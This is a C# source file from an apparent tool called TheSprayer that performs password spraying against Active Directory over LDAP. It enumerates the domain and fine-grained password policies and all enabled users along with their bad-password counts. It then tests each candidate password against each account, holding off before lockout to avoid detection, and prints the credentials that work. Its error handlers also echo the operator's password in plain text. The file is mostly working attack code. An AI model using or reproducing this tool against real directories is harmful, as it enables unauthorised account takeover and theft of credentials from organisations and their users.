using System;
using System.Net;
using System.DirectoryServices.Protocols;
using TheSprayer.Models;
using System.Collections.Generic;
using TheSprayer.Extensions;
using System.Linq;

namespace TheSprayer
{
    public class ActiveDirectoryService
    {
        private readonly string _domain;
        private readonly string _domainUser;
        private readonly string _domainUserPass;
        private readonly string _domainController;
        private readonly string _distinguishedName;

        public ActiveDirectoryService(string domain, string domainUser, string domainUserPass, string domainController)
        {
            _domain = domain;
            _domainUser = domainUser;
            _domainUserPass = domainUserPass;
            _domainController = domainController;

            //TODO: Get the DN properly instead of yolo'ing like this
            var splitDomain = _domain.Split('.');
            _distinguishedName = "";
            foreach (var split in splitDomain)
            {
                _distinguishedName += $"dc={split},";
            }
            _distinguishedName = _distinguishedName.TrimEnd(',');
        }

        /// <summary>
        /// Finds all fine grained password policies
        /// </summary>
        /// <remarks>
        /// Note this usually won't find the policy unless the user is privileged.
        /// To find unknown policies see the msDS-ResultantPSO user attribute
        /// </remarks>
        public List<PasswordPolicy> GetFineGrainedPasswordPolicy()
        {
            var policies = new List<PasswordPolicy>();
            string filter = "(objectClass=msDS-PasswordSettings)";

            LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
            connection.Credential = new NetworkCredential(_domainUser, _domainUserPass, _domain);
            SearchRequest searchRequest = new(_distinguishedName, filter, SearchScope.Subtree);

            try
            {
                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                foreach (SearchResultEntry entry in searchResponse.Entries)
                {
                    var name = entry.Attributes["distinguishedName"][0].ToString();
                    var precedence = entry.Attributes.GetIfExists<int>("msds-passwordsettingsprecedence");
                    var reversibleEncryption = entry.Attributes["msds-passwordreversibleencryptionenabled"][0].ToString() == "TRUE";
                    var complexityRequired = entry.Attributes["msds-passwordcomplexityenabled"][0].ToString() == "TRUE";
                    var pwdMaxAge = Convert.ToInt64(entry.Attributes["msds-maximumpasswordage"][0]) / (double)-864000000000;
                    var pwdMinAge = Convert.ToInt64(entry.Attributes["msds-minimumpasswordage"][0]) / (double)-864000000000;
                    var pwdMinLength = Convert.ToInt32(entry.Attributes["msds-minimumpasswordlength"][0]);
                    var pwdHistoryLength = Convert.ToInt32(entry.Attributes["msds-passwordhistorylength"][0]);
                    var lockoutThreshold = Convert.ToInt32(entry.Attributes["msds-lockoutthreshold"][0]);
                    var lockoutDuration = Convert.ToInt64(entry.Attributes["msds-lockoutduration"][0]) / (double)-600000000;
                    var observationWindow = Convert.ToInt64(entry.Attributes["msds-lockoutobservationwindow"][0]) / (double)-600000000;
                    policies.Add(new PasswordPolicy()
                    {
                        Name = name,
                        Precedence = precedence,
                        PasswordMaxAge = pwdMaxAge,
                        PasswordMinAge = pwdMinAge,
                        PasswordMinLength = pwdMinLength,
                        PasswordHistoryLength = pwdHistoryLength,
                        LockoutThreshold = lockoutThreshold,
                        LockoutDuration = lockoutDuration,
                        ObservationWindow = observationWindow,
                        IsComplexityRequired = complexityRequired,
                        IsEncryptionReversible = reversibleEncryption
                    });
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
                Console.WriteLine(_domainController + " " + _domainUser + " " + _domainUserPass + " " + _domain);
            }

            return policies;
        }

        public PasswordPolicy GetPasswordPolicy()
        {
            string filter = "(&(objectClass=domainDNS))";

            LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
            connection.Credential = new NetworkCredential(_domainUser, _domainUserPass, _domain);
            SearchRequest searchRequest = new(_distinguishedName, filter, SearchScope.Subtree);

            try
            {
                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                var entry = searchResponse.Entries[0];
                var pwdMaxAge = Convert.ToInt64(entry.Attributes["MaxPwdAge"][0]) / (double)-864000000000;
                var pwdMinAge = Convert.ToInt64(entry.Attributes["MinPwdAge"][0]) / (double)-864000000000;
                var pwdMinLength = Convert.ToInt32(entry.Attributes["MinPwdLength"][0]);
                var pwdHistoryLength = Convert.ToInt32(entry.Attributes["PwdHistoryLength"][0]);
                var lockoutThreshold = Convert.ToInt32(entry.Attributes["LockoutThreshold"][0]);
                var lockoutDuration = Convert.ToInt64(entry.Attributes["LockoutDuration"][0]) / (double)-600000000;
                var observationWindow = Convert.ToInt64(entry.Attributes["LockoutObservationWindow"][0]) / (double)-600000000;
                var passwordProperties = (PasswordProperties)Convert.ToInt32(entry.Attributes["PwdProperties"][0]);
                var complexityRequired = (passwordProperties & PasswordProperties.DOMAIN_PASSWORD_COMPLEX) == PasswordProperties.DOMAIN_PASSWORD_COMPLEX;
                var reversibleEncryption = (passwordProperties & PasswordProperties.DOMAIN_PASSWORD_STORE_CLEARTEXT) == PasswordProperties.DOMAIN_PASSWORD_STORE_CLEARTEXT;
                return new PasswordPolicy()
                {
                    Name = "Default Password Policy",
                    Precedence = int.MaxValue,
                    PasswordMaxAge = pwdMaxAge,
                    PasswordMinAge = pwdMinAge,
                    PasswordMinLength = pwdMinLength,
                    PasswordHistoryLength = pwdHistoryLength,
                    LockoutThreshold = lockoutThreshold,
                    LockoutDuration = lockoutDuration,
                    ObservationWindow = observationWindow,
                    IsComplexityRequired = complexityRequired,
                    IsEncryptionReversible = reversibleEncryption
                };
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
                Console.WriteLine(_domainController + " " + _domainUser + " " + _domainUserPass + " " + _domain);
                return null;
            }
        }

        // This class uses the System.DirectoryServices.Protocols namespace to retrieve domain users over LDAP. 
        // There are other options that are easier to work with but this one was chosen because it's the only one that is cross platform.
        public List<ActiveDirectoryUser> GetAllDomainUsers()
        {
            var adUsers = new List<ActiveDirectoryUser>();

            int pageCount = 0;
            // Get specific attributes. There's a heap that aren't relevant and when there are tons of users it will lessen the load on the DC
            string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO" };
            // LDAP Filter to get all domain users. This needs to be modified but works for testing.

            string filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))";
            // Initiate a new LDAP connection.
            // todo: initiate LDAPS connection if LDAP fails
            LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
            connection.Credential = new NetworkCredential(_domainUser, _domainUserPass, _domain);
            // Numerous Authtypes are possible
            // todo: have this selectable from the UI
            //connection.AuthType = AuthType.Kerberos;
            SearchRequest searchRequest = new(_distinguishedName,
                                      filter,
                                      SearchScope.Subtree,
                                      attributes);

            // set the size of the page results. This is a heavy operation for domain controllers so paging is necessary.
            PageResultRequestControl prc = new(500);
            SearchOptionsControl so = new(SearchOption.DomainScope);
            searchRequest.Controls.Add(prc);
            searchRequest.Controls.Add(so);

            try
            {
                do
                {
                    pageCount++;
                    SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
                    //find the returned page response control - http://dunnry.com/blog/PagingInSystemDirectoryServicesProtocols.aspx
                    foreach (DirectoryControl control in searchResponse.Controls)
                    {
                        if (control is PageResultResponseControl resultControl)
                        {
                            //update the LDAP cookie for next set
                            prc.Cookie = resultControl.Cookie;
                            break;
                        }
                    }
                    //Console.WriteLine("\r\nLDAP Cookie:{0}", prc.Cookie);
                    //Console.WriteLine("\r\nSearch Response Entries:{0}", searchResponse.Entries.Count);
                    // Loop through every response
                    foreach (SearchResultEntry entry in searchResponse.Entries)
                    {
                        adUsers.Add(new ActiveDirectoryUser()
                        {
                            UserPrincipalName = entry.Attributes.GetIfExists("userPrincipalName"),
                            SamAccountName = entry.Attributes.GetIfExists("sAMAccountName"),
                            DistinguishedName = entry.Attributes.GetIfExists("distinguishedName"),
                            GivenName = entry.Attributes.GetIfExists("givenName"),
                            Surname = entry.Attributes.GetIfExists("sn"),
                            Description = entry.Attributes.GetIfExists("description"),
                            LastLogin = entry.Attributes.GetIfExists<DateTime?>("lastLogon"),
                            BadPasswordAttempts = entry.Attributes.GetIfExists<int>("badPwdCount"),
                            LogonCount = entry.Attributes.GetIfExists<int>("logonCount"),
                            PasswordLastSet = entry.Attributes.GetIfExists<DateTime?>("pwdLastSet"),
                            AccountExpiry = entry.Attributes.GetIfExists<DateTime?>("accountExpires"),
                            DateCreated = entry.Attributes.GetIfExists<DateTime?>("createTimeStamp"),
                            PasswordPolicyName = entry.Attributes.GetIfExists("msDS-ResultantPSO") ?? "Default Password Policy",
                            ADsPath = entry.Attributes.GetIfExists("ADsPath"),
                            Company = entry.Attributes.GetIfExists("company"),
                            ObjectSid = entry.Attributes.GetIfExists("objectSid"),
                            SidHistory = entry.Attributes.GetIfExists("sIDHistory"),
                            AdminDescription = entry.Attributes.GetIfExists("adminDescription")
                        });
                    }
                } while (prc.Cookie.Length != 0);
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
                Console.WriteLine(_domainController + " " + _domainUser + " " + _domainUserPass + " " + _domain);
            }

            return adUsers;
        }

        public void SprayPasswords(string[] passwords, int attemptsToLeave = 2)
        {
            var defaultPasswordPolicy = GetPasswordPolicy();
            var fineGrainedPasswordPolicies = GetFineGrainedPasswordPolicy();
            var users = GetAllDomainUsers();

            foreach (var password in passwords)
            {
                foreach (var user in users)
                {
                    var shouldSpray = false;
                    var policyName = user.PasswordPolicyName;
                    PasswordPolicy policy;
                    if (policyName == "Default Password Policy")
                    {
                        policy = defaultPasswordPolicy;
                    }
                    else
                    {
                        policy = fineGrainedPasswordPolicies.FirstOrDefault(p => p.Name == policyName);
                    }

                    if (policy == null) // Fine grained policy that we can't see :(
                    {
                        // Fine grained password policy detected but not readable, skipping user.
                    }
                    else if (policy.LockoutThreshold == 0) //We can go forever :D
                    {
                        // $"Spraying {user.SamAccountName}. No lockout limits."
                        shouldSpray = true;
                    }
                    else
                    {
                        var remainingAttempts = policy.LockoutThreshold - user.BadPasswordAttempts;
                        if (remainingAttempts >= attemptsToLeave)
                        {
                            //$"Spraying {user.SamAccountName}. Attempts before lockout: {remainingAttempts}"
                            shouldSpray = true;
                        }
                        else
                        {
                            // User is too close to being locked, skipping.
                        }
                    }

                    if (shouldSpray)
                    {
                        if (TryValidateCredentials(user.SamAccountName, password, out var message))
                        {
                            Console.WriteLine($"{user.SamAccountName}:{password}");
                        }
                    }
                }
            }
        }

        public bool TryValidateCredentials(string username, string password)
        {
            return TryValidateCredentials(username, password, out var _);
        }

        public bool TryValidateCredentials(string username, string password, out string message)
        {
            LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
            connection.Credential = new NetworkCredential(username, password, _domain);
            
            try
            {
                connection.Bind();
                message = "Success!";
                return true;
            }
            catch(LdapException e)
            {
                message = e.Message;
                return false;
            }
        }
    }
}